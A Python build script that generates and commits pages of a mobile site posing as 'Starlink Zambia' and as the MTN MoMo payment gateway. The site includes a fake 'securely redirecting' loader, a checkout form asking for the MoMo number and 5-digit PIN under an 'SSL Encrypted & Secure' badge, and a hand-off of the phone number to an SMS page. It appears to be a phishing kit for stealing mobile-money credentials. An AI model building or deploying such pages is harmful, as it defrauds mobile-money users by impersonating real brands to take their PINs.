#!/usr/bin/env python3
"""act9.py - Timestep 9: Page 3 (MoMo gateway) + loader transition.

Scope:
  1. Append two rules to components.css: .overlay[hidden] and
     .pin-input (5-digit masked PIN field).
  2. Add a hidden loader overlay to plans.html (the ~5 s MoMo
     redirect animation shown after a plan is tapped).
  3. Update pages/plans.js so tapping a plan card shows the loader,
     waits Copy.loader.dwellMs, then navigates to checkout.html.
  4. Add checkout.html (Page 3 structure) and pages/checkout.js
     which reads ?plan=<code>, renders the amount + service label,
     and wires the confirm button (enabled only when 5 PIN digits
     are entered).

Side effects
------------
* Appends to web/assets/css/components.css (idempotent).
* Rewrites web/plans.html and web/assets/js/pages/plans.js.
* Creates web/checkout.html and web/assets/js/pages/checkout.js.
* Commits the result with a descriptive message.
"""
from __future__ import annotations

import logging
import subprocess
import sys
from pathlib import Path

SCRIPT_NAME: str = Path(__file__).name
TIMESTEP: int = 9

COMMIT_MESSAGE: str = (
    "act9: add page 3 (momo gateway) + loader transition\n"
    "\n"
    "Adds web/checkout.html and pages/checkout.js (reads ?plan, renders\n"
    "amount + service, wires 5-digit PIN confirm). Adds a hidden loader\n"
    "overlay to plans.html and updates pages/plans.js so tapping a plan\n"
    "shows the loader for Copy.loader.dwellMs before navigating.\n"
    "Appends .overlay[hidden] and .pin-input rules to components.css."
)

CSS_APPEND_MARKER = "/* --- Page 3 additions"
CSS_APPEND_BLOCK = """

/* --- Page 3 additions ----------------------------------------------------- */

.overlay[hidden] {
  display: none;
}

.pin-input {
  width: 100%;
  height: 56px;
  border: 1px solid var(--color-border-strong);
  border-radius: var(--radius-md);
  background: var(--color-surface);
  text-align: center;
  font-size: 28px;
  letter-spacing: 14px;
  padding-left: 14px; /* compensate trailing letter-spacing */
  outline: none;
  font-family: var(--font-sans);
  color: var(--color-text-primary);
}

.pin-input::placeholder {
  letter-spacing: 14px;
  color: var(--color-text-muted);
}
"""

PLANS_HTML: str = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#000000">
  <title>Plans - Starlink Zambia</title>
  <link rel="stylesheet" href="assets/css/tokens.css">
  <link rel="stylesheet" href="assets/css/base.css">
  <link rel="stylesheet" href="assets/css/components.css">
</head>
<body>
  <div class="app-shell">

    <header class="app-top-bar">
      <svg class="app-top-bar__brand" viewBox="0 0 120 28" aria-label="Starlink">
        <rect x="0" y="4" width="120" height="20" rx="2" fill="#cfcfcf" opacity="0.85"/>
        <text x="60" y="19" text-anchor="middle"
              font-family="Arial, sans-serif" font-size="11" font-weight="700"
              letter-spacing="2" fill="#4a4a4a">STARLINK</text>
      </svg>
    </header>

    <main class="app-content">

      <section class="hero-card">
        <h1 class="hero-card__title">High-Speed Internet</h1>
        <p class="hero-card__body">
          Experience the future of connectivity with our
          <strong>Shared Satellite Network</strong>. Using advanced
          <strong>Crowdsourcing Technology</strong>, we deliver
          high-speed Starlink data directly to your smartphone,
          anywhere in Zambia. Choose your plan and join the network
          instantly using <strong>MTN MoMo</strong>.
        </p>
      </section>

      <h2 class="section-heading">
        <svg class="section-heading__icon" viewBox="0 0 24 24"
             fill="none" stroke="currentColor" stroke-width="2"
             stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/>
          <path d="M3 6h18"/>
          <path d="M16 10a4 4 0 0 1-8 0"/>
        </svg>
        <span>Select Your Plan</span>
      </h2>

      <div id="plan-list" class="stack"></div>

    </main>

    <nav class="app-bottom-nav" aria-label="Primary">
      <a class="app-nav-item" href="index.html">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <path d="M5 12.55a11 11 0 0 1 14 0"/>
          <path d="M8.5 16.03a6 6 0 0 1 7 0"/>
          <path d="M2 8.82a15 15 0 0 1 20 0"/>
          <line x1="12" y1="20" x2="12.01" y2="20"/>
        </svg>
        <span>Status</span>
      </a>
      <a class="app-nav-item" href="plans.html" aria-current="page">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/>
          <path d="M3 6h18"/>
          <path d="M16 10a4 4 0 0 1-8 0"/>
        </svg>
        <span>Plans</span>
      </a>
      <a class="app-nav-item" href="#orders">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <line x1="8" y1="6" x2="21" y2="6"/>
          <line x1="8" y1="12" x2="21" y2="12"/>
          <line x1="8" y1="18" x2="21" y2="18"/>
          <line x1="3" y1="6" x2="3.01" y2="6"/>
          <line x1="3" y1="12" x2="3.01" y2="12"/>
          <line x1="3" y1="18" x2="3.01" y2="18"/>
        </svg>
        <span>Orders</span>
      </a>
      <a class="app-nav-item" href="#settings">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <circle cx="12" cy="12" r="3"/>
          <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.6 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.6a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1Z"/>
        </svg>
        <span>Settings</span>
      </a>
    </nav>

    <!-- MoMo redirect loader (shown after a plan is tapped) ----------- -->
    <div class="overlay" id="momo-loader" hidden>
      <div class="loader-card" role="status" aria-live="polite">
        <div class="loader-spinner" aria-hidden="true"></div>
        <div class="loader-card__logo" aria-hidden="true">MoMo</div>
        <h2 class="loader-card__title">Processing...</h2>
        <p class="loader-card__body">
          Securely redirecting to MTN MoMo payment gateway
        </p>
        <p class="loader-card__footnote">Please do not refresh the page</p>
      </div>
    </div>

  </div>

  <script src="assets/js/data/copy.js"></script>
  <script src="assets/js/data/plans.js"></script>
  <script src="assets/js/pages/plans.js"></script>
</body>
</html>
"""

PAGES_PLANS_JS: str = """\
/* ==========================================================================
   pages/plans.js
   Renders the plan cards on plans.html from window.Plans, and drives
   the MoMo redirect loader when a plan is tapped.
   ========================================================================== */

(function (global) {
  "use strict";

  var CONTAINER_ID = "plan-list";
  var LOADER_ID = "momo-loader";
  var CHECKOUT_PAGE = "checkout.html";

  /**
   * Show the MoMo redirect loader.
   */
  function showLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  /**
   * Navigate to *href* after the configured dwell time.
   * @param {string} href
   */
  function navigateAfterDwell(href) {
    var dwell = (global.Copy && global.Copy.loader &&
                 global.Copy.loader.dwellMs) || 5000;
    global.setTimeout(function () {
      global.location.href = href;
    }, dwell);
  }

  /**
   * Handle a click on a plan card: block default, show loader, dwell,
   * then navigate.
   * @param {MouseEvent} event
   */
  function handlePlanClick(event) {
    event.preventDefault();
    var href = event.currentTarget.href;
    showLoader();
    navigateAfterDwell(href);
  }

  /**
   * Build the anchor element for a single plan.
   * @param {Plan} plan
   * @returns {HTMLAnchorElement}
   */
  function buildPlanCard(plan) {
    var card = document.createElement("a");
    card.className = "card plan-card";
    card.href = CHECKOUT_PAGE + "?plan=" + encodeURIComponent(plan.code);
    card.setAttribute("aria-label",
      plan.name + ", " + plan.quotaLabel + ", " +
      global.Plans.formatPrice(plan) + " per " + plan.billingPeriod);

    var head = document.createElement("div");
    head.className = "plan-card__head";

    var name = document.createElement("h3");
    name.className = "plan-card__name";
    name.textContent = plan.name;

    var pill = document.createElement("span");
    pill.className = "pill";
    pill.textContent = plan.quotaLabel;

    head.appendChild(name);
    head.appendChild(pill);

    var desc = document.createElement("p");
    desc.className = "plan-card__desc";
    desc.textContent = plan.description;

    var price = document.createElement("p");
    price.className = "plan-card__price";
    price.textContent = global.Plans.formatPrice(plan);

    var period = document.createElement("span");
    period.className = "plan-card__price-period";
    period.textContent = "/" + plan.billingPeriod;
    price.appendChild(period);

    card.appendChild(head);
    card.appendChild(desc);
    card.appendChild(price);
    card.addEventListener("click", handlePlanClick);
    return card;
  }

  /**
   * Render all plans into the container element.
   */
  function render() {
    var container = document.getElementById(CONTAINER_ID);
    if (!container) {
      return;
    }
    container.textContent = "";
    global.Plans.all.forEach(function (plan) {
      container.appendChild(buildPlanCard(plan));
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", render);
  } else {
    render();
  }
})(window);
"""

CHECKOUT_HTML: str = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#000000">
  <title>MTN MoMo - Starlink Zambia</title>
  <link rel="stylesheet" href="assets/css/tokens.css">
  <link rel="stylesheet" href="assets/css/base.css">
  <link rel="stylesheet" href="assets/css/components.css">
</head>
<body>
  <div class="app-shell">

    <header class="app-top-bar">
      <svg class="app-top-bar__brand" viewBox="0 0 120 28" aria-label="Starlink">
        <rect x="0" y="4" width="120" height="20" rx="2" fill="#cfcfcf" opacity="0.85"/>
        <text x="60" y="19" text-anchor="middle"
              font-family="Arial, sans-serif" font-size="11" font-weight="700"
              letter-spacing="2" fill="#4a4a4a">STARLINK</text>
      </svg>
    </header>

    <main class="app-content">

      <section class="card card--flush" aria-labelledby="momo-title">
        <header class="momo-header">
          <div class="momo-header__logo" aria-hidden="true">MoMo</div>
          <h1 class="momo-header__title" id="momo-title">MTN MoMo</h1>
        </header>

        <div style="padding: var(--space-5);" class="stack">
          <div class="amount-block">
            <p class="amount-block__label">Amount</p>
            <p class="amount-block__value" id="amount-value">ZMW 45.00</p>
            <p class="amount-block__service-label">Service</p>
            <p class="amount-block__service">Starlink Renewal</p>
          </div>

          <p class="page-subtitle" style="text-align:center;">
            Enter your MTN MoMo details to authorize
          </p>

          <div class="field">
            <label class="field__label" for="phone">MTN MoMo Number</label>
            <div class="field__control">
              <span class="field__prefix">
                <span aria-hidden="true">&#127885;</span>
                <span>+260</span>
              </span>
              <input class="field__input" id="phone" name="phone"
                     type="tel" inputmode="numeric"
                     autocomplete="tel-national"
                     placeholder="77xxxxxxx" maxlength="9">
            </div>
          </div>

          <div class="field">
            <label class="field__label" for="pin">Enter PIN</label>
            <input class="pin-input" id="pin" name="pin"
                   type="password" inputmode="numeric"
                   autocomplete="one-time-code"
                   maxlength="5" pattern="[0-9]*"
                   placeholder="&#8226;&#8226;&#8226;&#8226;&#8226;"
                   aria-describedby="pin-hint">
            <p class="field__hint" id="pin-hint"
               style="text-align:center;">enter 5 digits</p>
          </div>

          <button type="button" class="btn btn--yellow"
                  id="confirm-payment" disabled>
            <svg class="btn__icon" viewBox="0 0 24 24" fill="none"
                 stroke="currentColor" stroke-width="2"
                 stroke-linecap="round" stroke-linejoin="round"
                 aria-hidden="true">
              <circle cx="12" cy="12" r="10"/>
              <path d="m9 12 2 2 4-4"/>
            </svg>
            <span>Confirm Payment</span>
          </button>

          <p class="trust">
            <svg class="trust__icon" viewBox="0 0 24 24" fill="none"
                 stroke="currentColor" stroke-width="2"
                 stroke-linecap="round" stroke-linejoin="round"
                 aria-hidden="true">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z"/>
            </svg>
            <span>SSL Encrypted &amp; Secure</span>
          </p>
        </div>
      </section>

    </main>

    <nav class="app-bottom-nav" aria-label="Primary">
      <a class="app-nav-item" href="index.html">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <path d="M5 12.55a11 11 0 0 1 14 0"/>
          <path d="M8.5 16.03a6 6 0 0 1 7 0"/>
          <path d="M2 8.82a15 15 0 0 1 20 0"/>
          <line x1="12" y1="20" x2="12.01" y2="20"/>
        </svg>
        <span>Status</span>
      </a>
      <a class="app-nav-item" href="plans.html" aria-current="page">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/>
          <path d="M3 6h18"/>
          <path d="M16 10a4 4 0 0 1-8 0"/>
        </svg>
        <span>Plans</span>
      </a>
      <a class="app-nav-item" href="#orders">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <line x1="8" y1="6" x2="21" y2="6"/>
          <line x1="8" y1="12" x2="21" y2="12"/>
          <line x1="8" y1="18" x2="21" y2="18"/>
          <line x1="3" y1="6" x2="3.01" y2="6"/>
          <line x1="3" y1="12" x2="3.01" y2="12"/>
          <line x1="3" y1="18" x2="3.01" y2="18"/>
        </svg>
        <span>Orders</span>
      </a>
      <a class="app-nav-item" href="#settings">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <circle cx="12" cy="12" r="3"/>
          <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.6 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.6a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1Z"/>
        </svg>
        <span>Settings</span>
      </a>
    </nav>

  </div>

  <script src="assets/js/data/copy.js"></script>
  <script src="assets/js/data/plans.js"></script>
  <script src="assets/js/pages/checkout.js"></script>
</body>
</html>
"""

PAGES_CHECKOUT_JS: str = """\
/* ==========================================================================
   pages/checkout.js
   Reads ?plan=<code>, renders the MoMo amount, wires the 5-digit PIN
   field and enables Confirm Payment only when the form is valid.
   On confirm, navigates to sms.html?plan=<code>&phone=<msisdn>.
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var SMS_PAGE = "sms.html";
  var PIN_LENGTH = 5;

  /**
   * Read a query-string parameter from the current URL.
   * @param {string} name
   * @returns {string | null}
   */
  function getQueryParam(name) {
    var params = new URLSearchParams(global.location.search);
    return params.get(name);
  }

  /**
   * Normalise a phone input into local 0-prefixed display form.
   * @param {string} raw
   * @returns {string}
   */
  function formatLocalPhone(raw) {
    var digits = (raw || "").replace(/\\D+/g, "");
    if (!digits) {
      return "";
    }
    return digits.charAt(0) === "0" ? digits : "0" + digits;
  }

  /**
   * Strip every non-digit from a string.
   * @param {string} value
   * @returns {string}
   */
  function digitsOnly(value) {
    return (value || "").replace(/\\D+/g, "");
  }

  /**
   * Resolve the plan from the URL, falling back to a default.
   * @returns {Plan}
   */
  function resolvePlan() {
    var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
    return global.Plans.findByCode(code) || global.Plans.findByCode(DEFAULT_PLAN_CODE);
  }

  /**
   * Render the amount block.
   * @param {Plan} plan
   */
  function renderAmount(plan) {
    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }
  }

  /**
   * Enable or disable the confirm button based on form validity.
   * @param {HTMLInputElement} pinInput
   * @param {HTMLButtonElement} button
   */
  function syncConfirmState(pinInput, button) {
    button.disabled = pinInput.value.length !== PIN_LENGTH;
  }

  /**
   * Wire the checkout form.
   */
  function wireForm(plan) {
    var phoneInput = document.getElementById("phone");
    var pinInput = document.getElementById("pin");
    var confirmBtn = document.getElementById("confirm-payment");
    if (!phoneInput || !pinInput || !confirmBtn) {
      return;
    }

    phoneInput.addEventListener("input", function () {
      phoneInput.value = digitsOnly(phoneInput.value).slice(0, 9);
    });
    pinInput.addEventListener("input", function () {
      pinInput.value = digitsOnly(pinInput.value).slice(0, PIN_LENGTH);
      syncConfirmState(pinInput, confirmBtn);
    });

    confirmBtn.addEventListener("click", function () {
      var local = formatLocalPhone(phoneInput.value) || "079764645";
      var target = SMS_PAGE +
        "?plan=" + encodeURIComponent(plan.code) +
        "&phone=" + encodeURIComponent(local);
      global.location.href = target;
    });

    syncConfirmState(pinInput, confirmBtn);
  }

  /**
   * Entry point.
   */
  function init() {
    var plan = resolvePlan();
    renderAmount(plan);
    wireForm(plan);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""

LOGGER = logging.getLogger(SCRIPT_NAME)


def project_root() -> Path:
    """Return the directory containing this script."""
    return Path(__file__).resolve().parent


def write_file(path: Path, content: str) -> bool:
    """Write *content* to *path* if it differs. Return True if changed."""
    if path.exists() and path.read_text(encoding="utf-8") == content:
        return False
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8", newline="\n")
    return True


def append_if_missing(path: Path, marker: str, block: str) -> bool:
    """Append *block* to *path* once (idempotent). Return True if changed."""
    existing = path.read_text(encoding="utf-8") if path.exists() else ""
    if marker in existing:
        return False
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(existing + block, encoding="utf-8", newline="\n")
    return True


def run_git(root: Path, *args: str) -> subprocess.CompletedProcess[str]:
    """Run git in *root*; never raises. Decodes output as UTF-8."""
    return subprocess.run(
        ["git", *args],
        cwd=root,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )


def main() -> int:
    """Run act9: append CSS, rewrite plans files, add checkout files, commit."""
    logging.basicConfig(level=logging.INFO, format="%(message)s", stream=sys.stdout)
    root = project_root()

    LOGGER.info("%s - timestep %d starting", SCRIPT_NAME, TIMESTEP)

    # 1. Append new CSS rules
    css_path = root / "web" / "assets" / "css" / "components.css"
    css_changed = append_if_missing(css_path, CSS_APPEND_MARKER, CSS_APPEND_BLOCK)
    LOGGER.info("[%s] %s",
                "appended" if css_changed else "unchanged",
                css_path.relative_to(root))

    # 2. Write HTML / JS files
    targets = {
        root / "web" / "plans.html": PLANS_HTML,
        root / "web" / "assets" / "js" / "pages" / "plans.js": PAGES_PLANS_JS,
        root / "web" / "checkout.html": CHECKOUT_HTML,
        root / "web" / "assets" / "js" / "pages" / "checkout.js": PAGES_CHECKOUT_JS,
    }
    for path, content in targets.items():
        changed = write_file(path, content)
        marker = "written" if changed else "unchanged"
        LOGGER.info("[%s] %s", marker, path.relative_to(root))

    # 3. Commit
    add = run_git(root, "add", "-A")
    if add.returncode != 0:
        LOGGER.error("git add failed: %s", add.stderr.strip())
        return 1

    commit = run_git(root, "commit", "-m", COMMIT_MESSAGE)
    if commit.returncode != 0:
        LOGGER.error("git commit failed: %s", commit.stderr.strip())
        return 1

    head = run_git(root, "log", "-n", "1", "--oneline")
    LOGGER.info("HEAD is now: %s", head.stdout.strip())
    LOGGER.info("%s - done", SCRIPT_NAME)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())